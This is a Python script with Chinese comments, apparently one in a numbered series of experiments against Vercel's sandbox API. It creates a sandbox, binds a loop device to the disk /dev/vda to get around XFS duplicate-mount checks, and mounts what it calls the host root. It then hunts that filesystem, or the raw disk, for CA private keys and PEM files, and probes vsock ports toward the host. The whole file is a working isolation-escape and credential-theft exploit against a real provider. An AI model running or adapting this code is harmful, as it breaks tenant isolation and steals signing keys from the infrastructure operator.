# 实验J142: loop设备绕过xfs重复挂载 -> 只读挂载宿主根 vda -> ca-key猎取
# j141结果: /dev/vda 可读(XFSB), mount /dev/vda 直接EBUSY(nouuid未绕过同设备)
# 方法: LOOP_SET_FD绑定/dev/loop0->/dev/vda -> mount /dev/loop0 ro,norecovery
#       设备路径不同(xfs dup检测比较m_fsname) -> 绕过EBUSY
#       失败兜底: python分块读前1GB扫BEGIN/ca-key(控制时长防进程被杀)
# 零破坏: 全程只读挂载(MS_RDONLY), 不写任何块
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj142"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, subprocess, socket, time, ctypes, fcntl
out = open("/tmp/d142.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=20):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

MOUNTED = False
p("=== LOOP_SETUP ===")
loop = None
try:
    vda = os.open("/dev/vda", os.O_RDWR)
    p("vda opened O_RDWR")
except Exception as e:
    p("VDA_O_RDWR_ERR", repr(e))
    try:
        vda = os.open("/dev/vda", os.O_RDONLY)
        p("vda opened O_RDONLY")
    except Exception as e2:
        p("VDA_O_RDONLY_ERR", repr(e2))
        vda = None
if vda is not None:
    for ln in range(8):
        try:
            loop = os.open("/dev/loop%d" % ln, os.O_RDWR)
            p("loop%d opened" % ln)
            try:
                fcntl.ioctl(loop, 0x4C00, vda)  # LOOP_SET_FD
                p("LOOP_SET_FD ok on loop%d" % ln)
                break
            except Exception as e:
                p("LOOP_SET_FD err on loop%d: %r" % (ln, e))
                os.close(loop)
                loop = None
        except Exception as e:
            p("loop%d open err %r" % (ln, e))

if loop:
    libc = ctypes.CDLL(None, use_errno=True)
    libc.mount.restype = ctypes.c_int
    os.makedirs("/tmp/host", exist_ok=True)
    r = -1
    for data in (b"norecovery", b"nouuid,norecovery", b"nouuid", b""):
        ctypes.set_errno(0)
        r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, data)
        p("mount loop0", data, "rc", r, "errno", ctypes.get_errno(), os.strerror(ctypes.get_errno()))
        if r == 0:
            MOUNTED = True
            break
    if not MOUNTED:
        ctypes.set_errno(0)
        r = libc.mount(b"/dev/vda", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
        p("retry mount vda rc", r, "errno", ctypes.get_errno(), os.strerror(ctypes.get_errno()))
        MOUNTED = (r == 0)

if MOUNTED:
    p("=== HOST_ROOT ===")
    p(sh("ls -la /tmp/host/ | head -40"))
    p("=== HOST_RUN_CELL ===")
    p(sh("ls -la /tmp/host/run/cell/ 2>&1"))
    p("=== HOST_VOLUMES ===")
    p(sh("ls -la /tmp/host/volumes/ 2>&1 | head -25"))
    p("=== FIND_KEY ===")
    p(sh("find /tmp/host/run /tmp/host/etc /tmp/host/volumes /tmp/host/root /tmp/host/home /tmp/host/srv /tmp/host/opt /tmp/host/var -maxdepth 7 \\( -name '*ca-key*' -o -name '*key*.pem' -o -name '*.key' -o -name '*private*' \\) 2>/dev/null | head -60", 60))
    p("=== FIND_PEM ===")
    p(sh("find /tmp/host -maxdepth 4 -name '*.pem' 2>/dev/null | head -40", 40))
    p("=== CAT_CELL ===")
    p(sh("for f in /tmp/host/run/cell/*; do echo --FILE $f; head -c 3000 \"$f\" 2>&1; echo; done", 30))
    p("=== GREP_KEYS ===")
    p(sh("grep -rls 'BEGIN.*PRIVATE KEY' /tmp/host/run /tmp/host/etc /tmp/host/volumes /tmp/host/root /tmp/host/home 2>/dev/null | head -20", 60))
else:
    p("=== RAW_SCAN_HEAD ===")
    try:
        f = open("/dev/vda", "rb")
        total = 0
        hits = []
        while total < 1024 * 1024 * 1024:
            chunk = f.read(32 * 1024 * 1024)
            if not chunk:
                break
            idx = 0
            while True:
                i = chunk.find(b"BEGIN", idx)
                if i < 0:
                    break
                seg = chunk[max(0, i - 120):i + 260]
                if b"PRIVATE KEY" in seg or b"RSA" in seg or b"EC PRIVATE" in seg or b"CERTIFICATE" in seg:
                    hits.append((total + i, seg))
                idx = i + 1
            total += len(chunk)
        p("scanned MB", total // (1024 * 1024), "hits", len(hits))
        for off, seg in hits[:15]:
            p("OFF", off, repr(seg[:380]))
        f.close()
    except Exception as e:
        p("SCAN_ERR", repr(e))
    p("=== RAW_SCAN_KEYNAME ===")
    try:
        f = open("/dev/vda", "rb")
        total = 0
        hits = []
        while total < 1024 * 1024 * 1024:
            chunk = f.read(32 * 1024 * 1024)
            if not chunk:
                break
            idx = 0
            while True:
                i = chunk.find(b"ca-key", idx)
                if i < 0:
                    break
                seg = chunk[max(0, i - 100):i + 200]
                hits.append((total + i, seg))
                idx = i + 1
            total += len(chunk)
        p("scanned MB", total // (1024 * 1024), "ca-key hits", len(hits))
        for off, seg in hits[:15]:
            p("OFF", off, repr(seg[:300]))
        f.close()
    except Exception as e:
        p("SCAN2_ERR", repr(e))

p("=== VSOCK_NET ===")
p(sh("cat /proc/net/vsock 2>&1 | head -30"))
p("=== VSOCK_CONNECT ===")
AF_VSOCK = 40
for cid, port in [(2, 22), (2, 80), (2, 443), (2, 3000), (2, 5000), (2, 8000), (2, 8080), (2, 9000), (2, 2379), (2, 10250), (2, 6443), (2, 1), (2, 9), (3, 22), (3, 443)]:
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((cid, port))
        p("CONNECT_OK cid=%d port=%d" % (cid, port))
        s.close()
    except Exception as e:
        p("p", port, "cid", cid, "err", repr(e)[:90])
p("=== VSOCK_BIND ===")
try:
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
    s.bind((4294967295, 12345))
    s.listen(1)
    s.settimeout(2)
    p("bind/listen ok")
    try:
        c, a = s.accept()
        p("accept", a)
        c.close()
    except Exception as e:
        p("accept err", repr(e)[:100])
    s.close()
except Exception as e:
    p("bind err", repr(e)[:100])
p("=== DONE")
out.close()
"""

run_cmd(sid, PROBE, "loop-mount", timeout=300)
c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/d142.txt"], "wait": True, "logs": True, "timeout": 100})
print(f"=== d142 status {c2} ===", flush=True)
print(r2[:20000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
